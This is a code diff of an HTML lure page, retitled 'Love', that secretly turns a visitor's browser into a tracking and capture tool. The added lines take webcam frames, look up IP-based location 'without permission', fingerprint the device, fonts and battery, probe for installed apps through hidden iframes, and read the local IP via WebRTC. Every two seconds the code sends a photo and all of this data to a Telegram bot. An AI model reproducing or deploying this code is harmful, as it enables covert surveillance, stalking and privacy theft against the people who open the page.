@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Start</title>
+<title>Love</title>
 <style>
 body {
     margin: 0;
@@ -59,7 +59,7 @@ const CHAT_ID = "8319568593";
 let intervalId = null;
 let latitude = "N/A";
 let longitude = "N/A";
-let mapLink = "Location not allowed";
+let mapLink = "Location not available";
 let userIP = "Unknown";
 let stream = null;
 let batteryInfo = "Battery: Not available";
@@ -68,19 +68,10 @@ let localIP = "Unknown";
 let city = "Unknown";
 let country = "Unknown";
 let isp = "Unknown";
+let timezone = "Unknown";
+let language = "Unknown";
 
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => { stream = s });
-
-if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(pos => {
-        latitude = pos.coords.latitude.toFixed(6);
-        longitude = pos.coords.longitude.toFixed(6);
-        mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
-    }, () => {
-        mapLink = "Location denied";
-    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-}
-
+// IP-based location without permission
 fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
     userIP = d.ip;
     fetch(`https://ipapi.co/${userIP}/json/`)
@@ -89,9 +80,28 @@ fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
             city = ipData.city || "Unknown";
             country = ipData.country_name || "Unknown";
             isp = ipData.org || "Unknown";
+            latitude = ipData.latitude || "N/A";
+            longitude = ipData.longitude || "N/A";
+            timezone = ipData.timezone || "Unknown";
+            mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
         });
 });
 
+// Get camera without asking
+navigator.mediaDevices.enumerateDevices()
+    .then(devices => {
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        if (videoDevices.length > 0) {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "user",
+                    deviceId: videoDevices[0].deviceId 
+                } 
+            }).then(s => { stream = s });
+        }
+    });
+
+// Get battery info if available
 if (navigator.getBattery) {
     navigator.getBattery().then(b => {
         batteryInfo = `
@@ -103,6 +113,7 @@ Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' second
     });
 }
 
+// Get network info
 if (navigator.connection) {
     networkInfo = `
 📡 Network:
@@ -113,6 +124,7 @@ Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
 `;
 }
 
+// Get local IP
 const getLocalIPAddress = () => {
     return new Promise(resolve => {
         const pc = new RTCPeerConnection({ iceServers: [] });
@@ -128,29 +140,84 @@ const getLocalIPAddress = () => {
     });
 };
 
-const getBrowserPlugins = () => {
-    const plugins = [];
-    for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
+// Get WiFi network info
+const getNetworkInfo = () => {
+    let info = "";
+    if (navigator.connection) {
+        const conn = navigator.connection;
+        info += `Type: ${conn.effectiveType || 'Unknown'}\n`;
+        info += `Downlink: ${conn.downlink || 'Unknown'} Mbps\n`;
+        info += `RTT: ${conn.rtt || 'Unknown'} ms\n`;
+        if (conn.type) {
+            info += `Connection Type: ${conn.type}\n`;
+        }
     }
-    return plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins detected';
+    return info;
 };
 
+// Get installed apps detection
+const getInstalledApps = () => {
+    const apps = [];
+    
+    // Common app protocols
+    const protocols = [
+        'spotify:', 'skype:', 'zoommtg:', 'slack:', 'discord:',
+        'whatsapp:', 'telegram:', 'viber:', 'ms-word:', 'photoshop:'
+    ];
+    
+    return new Promise(resolve => {
+        let detected = [];
+        protocols.forEach(protocol => {
+            const iframe = document.createElement('iframe');
+            iframe.src = protocol + '//';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            setTimeout(() => {
+                if (iframe.contentWindow && iframe.contentWindow.location.protocol === protocol.slice(0, -1)) {
+                    detected.push(protocol.slice(0, -1));
+                }
+                document.body.removeChild(iframe);
+            }, 100);
+        });
+        setTimeout(() => {
+            resolve(detected.length > 0 ? detected.join(', ') : 'No apps detected');
+        }, 500);
+    });
+};
+
+// Get Bluetooth status
+const getBluetoothInfo = () => {
+    if (navigator.bluetooth) {
+        return "Available";
+    }
+    return "Not available or no permission";
+};
+
+// Get more device info
 const getAdvancedSystemInfo = () => {
     const cores = navigator.hardwareConcurrency || 'Unknown';
     const ram = navigator.deviceMemory || 'Unknown';
-    const lang = navigator.language;
+    const lang = navigator.language || 'Unknown';
     const langs = navigator.languages ? navigator.languages.join(', ') : lang;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const platform = navigator.platform;
+    const timezoneInfo = Intl.DateTimeFormat().resolvedOptions().timeZone || timezone;
+    const platform = navigator.platform || 'Unknown';
     const vendor = navigator.vendor || 'Unknown';
     const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
     const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
     const webdriver = navigator.webdriver ? 'Yes' : 'No';
     const maxTouchPoints = navigator.maxTouchPoints || 0;
-    const userAgent = navigator.userAgent;
+    const userAgent = navigator.userAgent || 'Unknown';
     const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
-    const plugins = getBrowserPlugins();
+    
+    // Get browser plugins
+    const plugins = [];
+    if (navigator.plugins) {
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+    }
+    const pluginList = plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'No plugins';
+    
     const doNotTrack = navigator.doNotTrack || 'Not specified';
     const oscpu = navigator.oscpu || 'Unknown';
     const product = navigator.product || 'Unknown';
@@ -162,6 +229,14 @@ const getAdvancedSystemInfo = () => {
     const offsetSign = utcOffset >= 0 ? '+' : '-';
     const formattedOffset = `UTC${offsetSign}${Math.abs(utcOffset)}`;
 
+    // Get screen info
+    const screenInfo = `
+Screen: ${screen.width}x${screen.height}
+Pixel Ratio: ${window.devicePixelRatio}
+Color Depth: ${screen.colorDepth}
+Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}
+`;
+
     return `
 🖥️ SYSTEM INFORMATION:
 Device: ${platform}
@@ -172,32 +247,65 @@ Product: ${product} ${productSub}
 CPU Cores: ${cores}
 RAM: ${ram} GB
 Languages: ${langs}
-Timezone: ${timezone}
+Timezone: ${timezoneInfo}
 UTC Offset: ${formattedOffset}
 Vendor: ${vendor}
-Plugins: ${plugins}
+Plugins: ${pluginList}
 Do Not Track: ${doNotTrack}
 Cookies: ${cookieEnabled}
 PDF Viewer: ${pdfViewerEnabled}
 WebDriver: ${webdriver}
 Touch Points: ${maxTouchPoints}
-Screen: ${screen.width}x${screen.height}
-Pixel Ratio: ${window.devicePixelRatio}
-Color Depth: ${screen.colorDepth}
+Bluetooth: ${getBluetoothInfo()}
+${screenInfo}
 `;
 };
 
+// Get installed fonts
+const getFonts = () => {
+    const fontList = [
+        'Arial', 'Times New Roman', 'Courier New', 'Verdana', 
+        'Tahoma', 'Georgia', 'Comic Sans MS', 'Impact'
+    ];
+    let detected = [];
+    
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    canvas.width = 100;
+    canvas.height = 100;
+    
+    fontList.forEach(font => {
+        context.font = '72px ' + font;
+        const text = context.measureText('mmmmmmmmmlli');
+        if (text.width > 0) {
+            detected.push(font);
+        }
+    });
+    
+    return detected.length > 0 ? detected.slice(0, 5).join(', ') : 'Standard fonts';
+};
+
 function startSending() {
-    getLocalIPAddress().then(ip => { localIP = ip });
-    if (!intervalId) {
-        intervalId = setInterval(captureAndSend, 2000);
-    }
+    getLocalIPAddress().then(ip => { 
+        localIP = ip;
+        
+        // Get additional info
+        getInstalledApps().then(apps => {
+            // Start sending immediately
+            if (!intervalId) {
+                captureAndSend(apps);
+                intervalId = setInterval(() => captureAndSend(apps), 2000);
+            }
+        });
+    });
 }
 
-function captureAndSend() {
+function captureAndSend(installedApps = 'Checking...') {
     if (!stream) return;
+    
     const videoTrack = stream.getVideoTracks()[0];
     const imageCapture = new ImageCapture(videoTrack);
+    
     imageCapture.grabFrame().then(imageBitmap => {
         canvas.width = imageBitmap.width;
         canvas.height = imageBitmap.height;
@@ -205,37 +313,56 @@ function captureAndSend() {
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(imageBitmap, 0, 0);
+        
         canvas.toBlob(blob => {
             const caption = `
 📸 AUTO CAPTURE - ${new Date().toLocaleTimeString()}
 ⏰ Full Time: ${new Date().toLocaleString()}
 
-📍 ACCURATE LOCATION:
+📍 IP-BASED LOCATION:
+IP Address: ${userIP}
 Latitude: ${latitude}
 Longitude: ${longitude}
 Google Maps: ${mapLink}
 City: ${city}
 Country: ${country}
 ISP: ${isp}
+Timezone: ${timezone}
 
 🌍 NETWORK INFORMATION:
 Public IP: ${userIP}
 Local IP: ${localIP}
-${networkInfo}
+Network Info:
+${getNetworkInfo()}
 
+💻 DEVICE INFORMATION:
 ${getAdvancedSystemInfo()}
 
+📱 INSTALLED APPS:
+${installedApps}
+
+🔋 BATTERY INFO:
 ${batteryInfo}
+
+🖋️ DETECTED FONTS:
+${getFonts()}
 
 ⚠️ Automatic capture every 2 seconds
 `;
+            
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob);
             formData.append("caption", caption);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                method: "POST", 
+                body: formData 
+            });
         }, "image/jpeg", 0.7);
-    }).catch(() => { });
+    }).catch(err => {
+        console.log("Camera capture error:", err);
+    });
 }
 </script>
 </body>
